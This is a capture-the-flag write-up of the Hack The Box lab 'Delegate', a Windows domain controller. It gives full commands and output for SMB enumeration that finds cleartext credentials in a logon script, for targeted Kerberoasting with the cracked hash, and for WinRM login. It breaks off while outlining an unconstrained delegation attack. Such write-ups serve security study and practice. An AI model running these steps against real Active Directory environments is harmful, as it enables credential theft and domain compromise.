---
title: "HTB: Delegate"
date: 2025-09-12 12:12:12
categories: [HTB Writeup]
media_subpath: /assets/posts/2025-09-12-htb-delegate/
<!-- image: -->
<!--   path: delegate.png -->
tags: [htb, windows]
---

![](delegate.png)

{: .centered }
|**OS**|**Difficult**|
|Windows|Medium|

## Recon

### Initial Scan

I ran `nmap` and found 27 open TCP ports. I set `--min-rate` to 1500 for faster full port scan. Higher rates can sometimes cause false negatives. The port pattern matches that of a typical Windows AD domain controller.
```
❯ nmap -p- --max-retries 1 --min-rate 1500 --max-scan-delay 20 -T4 --open 10.129.234.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 19:22 CST
Nmap scan report for 10.129.234.69
Host is up (0.21s latency).
Not shown: 65508 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
55452/tcp open  unknown
55622/tcp open  unknown
59033/tcp open  unknown
59081/tcp open  unknown
59082/tcp open  unknown
59086/tcp open  unknown
```
I ran `nmap` again to enumerate services running on the open ports. I noticed RDP and WinRM were up, which could provide a potential entry point later with valid credentials.
```
❯ nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001 10.129.234.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 19:26 CST
Nmap scan report for 10.129.234.69
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-04 11:27:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2025-10-03T10:50:49
|_Not valid after:  2026-04-04T10:50:49
|_ssl-date: 2025-10-04T11:28:04+00:00; +40s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-04T11:27:26+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-10-04T11:27:29
|_  start_date: N/A
|_clock-skew: mean: 39s, deviation: 0s, median: 39s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.84 seconds
```
I used `nxc` to generate a hosts file and appended it to `/etc/hosts`.
```
❯ nxc smb 10.129.234.69 --generate-hosts-file hosts
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)

❯ cat hosts
10.129.234.69     DC1.delegate.vl delegate.vl DC1

❯ cat /etc/hosts hosts | sudo sponge /etc/hosts
```

### TCP 445 - SMB

I ran `nxc` to enuemrate shares with guest login, which was successful. No custom share was found.
```
❯ nxc smb 10.129.234.69 -u 'guest' -p '' --shares
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest:
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

I ran `smbclient` to enumerate the content of the NETLOGON share which normally contains user logon scripts if any.
```
❯ smbclient -N //10.129.234.69/NETLOGON
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 20:45:24 2023
  ..                                  D        0  Sat Aug 26 17:45:45 2023
  users.bat                           A      159  Sat Aug 26 20:54:29 2023

                4652287 blocks of size 4096. 1011261 blocks available
smb: \> get users.bat
getting file \users.bat of size 159 as users.bat (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> ^C

❯ cat users.bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123 
```

A set of cleartext credentials was found in a logon script.\
`A.Briggs:P4ssw0rd1#123`

## a.briggs

I ran `nxc` to verify the credential.
```
❯ nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

I then proceeded to credentialed enumeration. First I wanted to know what privileges the compromised user account possessed. Various tools are good for this task, I like `BloodyAD` for its versatility and intuitive commandline design.
```
❯ bloodyAD -u a.briggs -p 'P4ssw0rd1#123' --dc-ip 10.129.234.69 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=delegate,DC=vl
permission: WRITE

distinguishedName: CN=A.Briggs,CN=Users,DC=delegate,DC=vl
permission: WRITE

distinguishedName: CN=N.Thompson,CN=Users,DC=delegate,DC=vl
permission: WRITE
```

## n.thompson

### BloodHound

Now I confirmed the compromised user had write permission on `N.Thompson`. However, I couldn't use the same tool to check `N.Thompson`'s permissions without its credentials due to `bloodyAD`'s limitation. Next I ran `bloodhound-ce-python` to collect AD objects data.
```
❯ bloodhound-ce-python -u a.briggs -p 'P4ssw0rd1#123' -ns 10.129.234.69 -d delegate.vl -dc DC1.delegate.vl -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC1.delegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC1.delegate.vl
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
INFO: Done in 00M 38S
INFO: Compressing output into 20250912200539_bloodhound.zip
```

I uploaded the zip into the BloodHound-CE. I marked `a.briggs` as owned, then ran "Shortest paths from Owned objects" pre-built Cypher query, and found `a.briggs` had `GenericWrite` to `n.thompson` who was in `REMOTE MANAGEMENT USERS` group.\
![](bh-abriggs-to-nthompson.png)

### (fail) Shadow Credentials Attack

It was tempting to run shadow credentials attack against `n.thompson`. However, when I tried so I encountered `KDC_ERR_PADATA_TYPE_NOSUPP` error. This is because ADCS or CA were not configured in the Domain Controller, and the DC did not have its own key pair.
>Prerequisites for shadow credentials attack:
>1. be in a domain that supports PKINIT and containing at least one Domain Controller running Windows Server 2016 or above.
>2. be in a domain where the Domain Controller(s) has its own key pair (for the session key exchange) (e.g. happens when AD CS is enabled or when a certificate authority (CA) is in place).
>3. have control over an account that can edit the target object's msDs-KeyCredentialLink attribute.

### Targeted Kerberoasting

The next attack in line was Targeted Kerberoasting. I ran `targetedKerberoast.py` to get a Kerberoas hash for the `n.thompson` user.
```
❯ tools/targetedKerberoast/targetedKerberoast.py -u a.briggs -p 'P4ssw0rd1#123' --request-user n.thompson -d delegate.vl
[*] Starting kerberoast attacks
[*] Attacking user (n.thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$4840a714fa2318d65e48b8a68e90c25e$aa7a2c47eb888bcb17b3e6129debb42b8a80f2d6f1ebcb102ffc5ddd0305eb55d2765d8c6315ef6cf62416e8e9d7bcfa5f4c31a9e4c2adc68968d3d385151a8dcbdbc6fa599c9ad1ba0dd4118cf73787ca7c8ff632ac6ff598e65662f7bc2a0dd7f57621bddfa994d1ab369be05cf32baa4aa532430c9794a07521b766a988a9466dc2c20818e23b159858f334151de837954133afff44285a0f5edd64a8ec894ffc19e01292f7728a7535ac9dfc1c11bc5edd5c1591f79b056725ec0ed92c34980cf2a367692386e2370aeab8cea5edd31dbe1d9bf278762889c405ea08e7e22e1f9962eb7fc84782bc6834b8a3c957fbc27bcac1fbb80167001ab3bca4b7d679f51dec655cf0082359854ae7c7ed4903258e22663edbac328981198465fe984a0857f6f3701034142a0d698eb7850cd5d7e0c724a32e1e0ff7bff8a32d7edfbaaf1da88b73c0cc5049ff2858d761e59babc3c9716aa25beda4df7e963abb971e8edccab4ba49759dd205f2c377d3ac43ea2214a1c27057e6df8528b382e8eb0f96d244ba26f65284a5b33bfebd3bac8b65d06badc2d4cc06611cd1e8a79995c94277795ffe365cd6b3c39d992593e5ab1f63ecfc4306a37e2a86c9a2a42a3f3a0b443f397ecbf95d417657ed73a91adab766d5f9a9608cda7f2cc53a26ec19a7a17f70ba3746d8a8c48aaf009780b10e6bef2b9ff3ded3baff2a03e0ff05d50a4d1f234190493f477b6401246001285df09d879ead53d46f8c509b9ba2881e424e2d6cf515fd61d29fedf01c4d7fbb142112a6cf99f56bd9db5fe9c69fdf3dfb183b6ff0686ce7f4efdeefc7979027a898ee9c25d13dfce4abe4a9ec3df1dd656990ce0240b8a00df5b1fbf2e851dc6724943d20dff8fb4a347e1ca0ca59c7a5e59ff47949f4fdb02543aa39309413b387d535831640cc2efd894836e1d4239ebbb9304aa5f94dfc78ed6e362100565da233f545aeaa9859a1764e36e0f3c9e8ddc087877e79239216c67f5681702788b28a8482d6fed0ddd8fdfad3177273c2a4cd602716f784bedeea44bc971993e820c610e91c28ba2522a4a2194cf96c007d0b3c163f2626e4e8aa2a8555aad17fb9e29230a8178cc2b1ac7046651f3e94c9fc462d157f874544259d74cb56ab35cea119292f35adf6cea6a46cd826046e13442093db1fb3577d1f6d9159a2524bad8c3e77f900b47e5a3fa56704fd0ebb39384660a0031c043270fb0a08720ced2f77bfa536d3c9dffb274a308339d70cc4a88386111175ca403abce5ea6427fcd542d0b96aa2e9abceae95597ed337b7ddd6ead325635d8c9d0e81e1c493b16803299dec06c2a35ba1df9ae7dfa7b15e949101c8b3f565a68537362582078a595c254cc387888a68694d394922f527f62d63dd1e08ced1ed9b9589b95f8e4f7dac783ae0275f85113c64419230b9b36f2a5b3d
```

Then I ran `hashcat` to crack the hash.
```
❯ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$4840a714fa2318d65e48b8a68e90c25e$aa7a2c47eb888bcb17b3e6129debb42b8a80f2d6f1ebcb102ffc5ddd0305eb55d2765d8c6315ef6cf62416e8e9d7bcfa5f4c31a9e4c2adc68968d3d385151a8dcbdbc6fa599c9ad1ba0dd4118cf73787ca7c8ff632ac6ff598e65662f7bc2a0dd7f57621bddfa994d1ab369be05cf32baa4aa532430c9794a07521b766a988a9466dc2c20818e23b159858f334151de837954133afff44285a0f5edd64a8ec894ffc19e01292f7728a7535ac9dfc1c11bc5edd5c1591f79b056725ec0ed92c34980cf2a367692386e2370aeab8cea5edd31dbe1d9bf278762889c405ea08e7e22e1f9962eb7fc84782bc6834b8a3c957fbc27bcac1fbb80167001ab3bca4b7d679f51dec655cf0082359854ae7c7ed4903258e22663edbac328981198465fe984a0857f6f3701034142a0d698eb7850cd5d7e0c724a32e1e0ff7bff8a32d7edfbaaf1da88b73c0cc5049ff2858d761e59babc3c9716aa25beda4df7e963abb971e8edccab4ba49759dd205f2c377d3ac43ea2214a1c27057e6df8528b382e8eb0f96d244ba26f65284a5b33bfebd3bac8b65d06badc2d4cc06611cd1e8a79995c94277795ffe365cd6b3c39d992593e5ab1f63ecfc4306a37e2a86c9a2a42a3f3a0b443f397ecbf95d417657ed73a91adab766d5f9a9608cda7f2cc53a26ec19a7a17f70ba3746d8a8c48aaf009780b10e6bef2b9ff3ded3baff2a03e0ff05d50a4d1f234190493f477b6401246001285df09d879ead53d46f8c509b9ba2881e424e2d6cf515fd61d29fedf01c4d7fbb142112a6cf99f56bd9db5fe9c69fdf3dfb183b6ff0686ce7f4efdeefc7979027a898ee9c25d13dfce4abe4a9ec3df1dd656990ce0240b8a00df5b1fbf2e851dc6724943d20dff8fb4a347e1ca0ca59c7a5e59ff47949f4fdb02543aa39309413b387d535831640cc2efd894836e1d4239ebbb9304aa5f94dfc78ed6e362100565da233f545aeaa9859a1764e36e0f3c9e8ddc087877e79239216c67f5681702788b28a8482d6fed0ddd8fdfad3177273c2a4cd602716f784bedeea44bc971993e820c610e91c28ba2522a4a2194cf96c007d0b3c163f2626e4e8aa2a8555aad17fb9e29230a8178cc2b1ac7046651f3e94c9fc462d157f874544259d74cb56ab35cea119292f35adf6cea6a46cd826046e13442093db1fb3577d1f6d9159a2524bad8c3e77f900b47e5a3fa56704fd0ebb39384660a0031c043270fb0a08720ced2f77bfa536d3c9dffb274a308339d70cc4a88386111175ca403abce5ea6427fcd542d0b96aa2e9abceae95597ed337b7ddd6ead325635d8c9d0e81e1c493b16803299dec06c2a35ba1df9ae7dfa7b15e949101c8b3f565a68537362582078a595c254cc387888a68694d394922f527f62d63dd1e08ced1ed9b9589b95f8e4f7dac783ae0275f85113c64419230b9b36f2a5b3d:KALEB_2341
```

I ran `nxc` to verify the credentials.
```
❯ nxc smb 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\n.thompson:KALEB_2341
```

They worked for WinRM.
```
❯ nxc rdp 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341'
RDP         10.129.234.69   3389   DC1              [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC1) (domain:delegate.vl) (nla:True)
RDP         10.129.234.69   3389   DC1              [+] delegate.vl\n.thompson:KALEB_2341

❯ nxc winrm 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341'
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.69   5985   DC1              [+] delegate.vl\n.thompson:KALEB_2341 (Pwn3d!)
```

Then I logged in via WinRM as `n.thompson`.
```
❯ evil-winrm -i 10.129.234.69 -u n.thompson -p KALEB_2341

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cat ../desktop/user.txt
<SNIP>
```

## Administrator

### Enum

There wasn't anything interesting in the root folder or the users folder.
```
*Evil-WinRM* PS C:\users> tree /f /a
Folder PATH listing
Volume serial number is 1753-FC39
C:.
+---Administrator
+---N.Thompson
|   +---Desktop
|   |       user.txt
|   |
|   +---Documents
|   +---Downloads
|   +---Favorites
|   +---Links
|   +---Music
|   +---Pictures
|   +---Saved Games
|   \---Videos
\---Public
```

I checked user's privileges next. Interestingly the user had `SeEnableDelegationPrivilege`, which can be abused for Unconstrained and Constrained delegation attacks to compromise the domain.
```
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

### Unconstrained Delegation Attack

The plan is to trick the domain controller into authenticating to a service hosted on a domain-joined computer configured with unconstrained delegation, while the attack machine impersonates that computer. This would allow the attack machine to capture the domain controller's TGT.
